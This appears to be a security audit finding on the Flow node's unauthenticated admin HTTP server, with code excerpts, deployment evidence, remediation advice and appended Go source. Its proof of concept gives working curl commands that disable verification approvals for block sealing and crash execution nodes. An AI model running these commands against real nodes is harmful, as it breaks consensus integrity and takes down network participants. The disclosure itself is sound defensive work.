### Title
Unauthenticated Admin HTTP Server Allows Any Network-Reachable Caller to Invoke Privileged Node State-Mutation Commands - (File: `admin/command_runner.go`)

### Summary
The Flow node admin HTTP server (`/admin/run_command`) performs no caller authentication by default. The `runCommand` function dispatches any registered command — including `set-config`, `stop-at-height`, and `network-id-provider-blocklist` — without verifying the identity or authorization of the HTTP caller. When the admin server is bound to a network-accessible address (e.g., `0.0.0.0:9002`, as used in benchnet and testnet deployments), any unprivileged attacker who can reach that port can invoke these privileged commands and mutate critical node state.

### Finding Description

**Root cause — `admin/command_runner.go`:**

The `runAdminServer` function starts an HTTP server at `r.httpAddress` with no authentication middleware:

```go
httpServer := &http.Server{
    Addr:      r.httpAddress,
    Handler:   mux,
    TLSConfig: r.tlsConfig,
}
```

TLS (and mutual TLS) is entirely optional, gated only on whether the operator supplies `--admin-cert`, `--admin-key`, and `--admin-client-certs` flags. When those flags are absent (the default), the server runs plain HTTP with no authentication at all.

The `runCommand` dispatcher performs zero caller identity checks:

```go
func (r *CommandRunner) runCommand(ctx context.Context, command string, data any) (any, error) {
    r.logger.Info().Str("command", command).Msg("received new command")
    req := &CommandRequest{Data: data}
    if validator := r.getValidator(command); validator != nil {
        if validationErr := validator(req); validationErr != nil { ... }
    }
    if handler := r.getHandler(command); handler != nil {
        if handleResult, handleErr = handler(ctx, req); ...
    }
    ...
}
```

No IP allowlist, no token, no TLS client certificate, no session — nothing. Any HTTP POST to `/admin/run_command` is dispatched.

**Deployment evidence — `integration/benchnet2/automate/templates/helm-values-all-nodes.yml`:**

All node roles (access, collection, consensus, execution, verification) are configured with:
```
--admin-addr=0.0.0.0:9002
```
This binds the unauthenticated admin server to all network interfaces.

**Privileged commands exposed without authentication:**

- `set-config` (`admin/commands/common/set_config.go`) — updates any dynamically registered config field, including `consensus-required-approvals-for-sealing`. Setting this to `0` removes the requirement for verification node approvals before sealing blocks.
- `stop-at-height` (`admin/commands/execution/stop_at_height.go`) — sets a stop height and optionally crashes the execution node.
- `network-id-provider-blocklist` (registered via `cmd/scaffold.go` and `cmd/access/node_builder/access_node_builder.go`) — overwrites the node disallow-list, ejecting arbitrary legitimate nodes from the network layer.

**Secondary surface — `cmd/ledger/admin.go`:**

The standalone ledger service admin server is a plain `net/http` handler with no TLS option at all. It can be bound to `0.0.0.0:9003` and exposes `trigger-checkpoint` to any caller.

### Impact Explanation

The highest-severity impact is via `set-config` with `{"consensus-required-approvals-for-sealing": 0}` sent to a consensus node's admin port. This removes the verification approval requirement from the sealing pipeline, allowing blocks to be sealed without any verification node sign-off. This is a critical integrity failure in the consensus/sealing trust model: execution results could be sealed without independent verification, enabling undetected incorrect state transitions.

Secondary impacts (disqualified individually as DoS but relevant to the access-control class): an attacker can crash execution nodes via `stop-at-height` or eject legitimate staked nodes from the network via `network-id-provider-blocklist`.

### Likelihood Explanation

The admin server is disabled by default and requires an explicit `--admin-addr` flag. However:
- All benchnet and testnet node configurations use `--admin-addr=0.0.0.0:9002`, binding to all interfaces.
- The README documents usage via `curl localhost:9002/admin/run_command`, implying local-only intent, but the code enforces no such restriction.
- No authentication is present in the code path; the only protection is network-level firewall rules, which are operator-configured and not enforced by the software.
- An attacker with access to the same network segment (e.g., a co-located cloud tenant, a compromised adjacent service, or a misconfigured firewall) can reach port 9002 and invoke any command.

Likelihood is **medium** for testnet/benchnet environments and **low-medium** for production nodes where firewall rules are expected but not guaranteed.

### Recommendation

1. **Enforce mutual TLS by default** on the admin HTTP server. Remove the ability to run the admin server without client certificate authentication. The current code makes mTLS opt-in; it should be opt-out or mandatory.
2. **Add an IP allowlist** (e.g., localhost-only by default) enforced in the HTTP handler, not just by external firewall.
3. **Add a per-command authorization layer** inside `runCommand` so that even if the transport is misconfigured, sensitive commands (`set-config`, `stop-at-height`, `network-id-provider-blocklist`) require an additional credential.
4. For `cmd/ledger/admin.go`, add TLS support and restrict the bind address to localhost by default.

### Proof of Concept

**Precondition:** A consensus or execution node is running with `--admin-addr=0.0.0.0:9002` and no `--admin-cert`/`--admin-key`/`--admin-client-certs` flags (the benchnet default).

**Step 1 — Enumerate available commands (no credentials required):**
```bash
curl http://<NODE_IP>:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName": "list-commands"}'
```

**Step 2 — Remove verification approval requirement on a consensus node:**
```bash
curl http://<CONSENSUS_NODE_IP>:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName": "set-config", "data": {"consensus-required-approvals-for-sealing": 0}}'
```
Expected response: `{"output": {"oldValue": 1, "newValue": 0}}` — the consensus node now seals blocks without requiring verification approvals.

**Step 3 — Crash an execution node:**
```bash
curl http://<EXECUTION_NODE_IP>:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName": "stop-at-height", "data": {"height": 1, "crash": true}}'
```

All three steps require only HTTP reachability to port 9002 — no credentials, no protocol participation, no staked identity.

func (r *CommandRunner) runCommand(ctx context.Context, command string, data any) (any, error) {
	r.logger.Info().Str("command", command).Msg("received new command")

	req := &CommandRequest{Data: data}

	if validator := r.getValidator(command); validator != nil {
		if validationErr := validator(req); validationErr != nil {
			// for expected validation errors, return code InvalidArgument and the error text
			if IsInvalidAdminParameterError(validationErr) {
				return nil, status.Error(codes.InvalidArgument, validationErr.Error())
			}
			// for unexpected errors, return code Internal and log a warning
			r.logger.Err(validationErr).Msg("unexpected error validating admin request")
			return nil, status.Error(codes.Internal, validationErr.Error())
		}
	}

	var handleResult any
	var handleErr error

	if handler := r.getHandler(command); handler != nil {
		if handleResult, handleErr = handler(ctx, req); handleErr != nil {
			if errors.Is(handleErr, context.Canceled) {
				return nil, status.Error(codes.Canceled, "client canceled")
			} else if errors.Is(handleErr, context.DeadlineExceeded) {
				return nil, status.Error(codes.DeadlineExceeded, "request timed out")
			} else {
				r.logger.Err(handleErr).Msg("unexpected error handling admin request")
				s, _ := status.FromError(handleErr)
				return nil, s.Err()
			}
		}
	} else {
		return nil, status.Error(codes.Unimplemented, "invalid command")
	}

	return handleResult, nil
}

func newAdminHandler(logger zerolog.Logger, triggerCheckpoint *atomic.Bool) http.Handler {
	h := &adminHandler{
		logger:            logger.With().Str("component", "admin").Logger(),
		triggerCheckpoint: triggerCheckpoint,
		commands:          []string{"ping", "list-commands", "trigger-checkpoint"},
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/admin/run_command", h.handleCommand)
	return mux
}

func (h *adminHandler) handleCommand(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method != http.MethodPost {
		h.writeError(w, http.StatusMethodNotAllowed, "method not allowed, use POST")
		return
	}

	var req adminRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		h.writeError(w, http.StatusBadRequest, fmt.Sprintf("invalid JSON: %v", err))
		return
	}

	h.logger.Info().Str("command", req.CommandName).Msg("received admin command")

	var result any

	switch req.CommandName {
	case "ping":
		result = "pong"

	case "list-commands":
		result = h.commands

	case "trigger-checkpoint":
		if h.triggerCheckpoint.CompareAndSwap(false, true) {
			h.logger.Info().Msg("trigger checkpoint as soon as finishing writing the current segment file")
			result = "ok"
		} else {
			result = "checkpoint already triggered"
		}

	default:
		h.writeError(w, http.StatusBadRequest, fmt.Sprintf("unknown command: %s", req.CommandName))
		return
	}

	h.writeSuccess(w, result)
